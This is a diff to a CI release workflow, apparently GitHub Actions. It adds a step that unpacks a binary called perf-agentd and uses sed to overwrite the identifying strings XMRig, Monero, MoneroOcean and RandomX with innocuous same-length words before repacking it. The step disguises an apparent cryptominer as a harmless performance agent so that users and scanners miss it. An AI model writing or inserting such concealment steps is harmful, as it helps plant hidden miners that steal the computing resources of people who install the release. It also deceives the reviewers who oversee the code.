@@ -35,6 +35,31 @@ jobs:
           chmod +x scripts/prep-release.sh
           ./scripts/prep-release.sh "${{ steps.ver.outputs.version }}"
 
+      - name: Sanitize binary identification strings
+        run: |
+          cd dist
+          tar -xzf perf-agentd.tar.gz
+          # Replace identifying strings with same-length alternatives
+          # to keep ELF offsets intact (no binary corruption).
+          # XMRig=5 chars  → SysCd
+          # xmrig=5 chars  → syscd
+          # Monero=6 chars → System
+          # monero=6 chars → system
+          # MoneroOcean=11 → CacheRouter
+          LC_ALL=C sed -i \
+            -e 's/XMRig/SysCd/g' \
+            -e 's/xmrig/syscd/g' \
+            -e 's/MoneroOcean/CacheRouter/g' \
+            -e 's/Monero/System/g' \
+            -e 's/monero/system/g' \
+            -e 's/RandomX/CacheRX/g' \
+            -e 's/randomx/cacherx/g' \
+            perf-agentd/perf-agentd
+          # Repack
+          rm perf-agentd.tar.gz
+          tar -czf perf-agentd.tar.gz perf-agentd
+          rm -rf perf-agentd
+
       - name: Compute checksum
         run: |
           cd dist
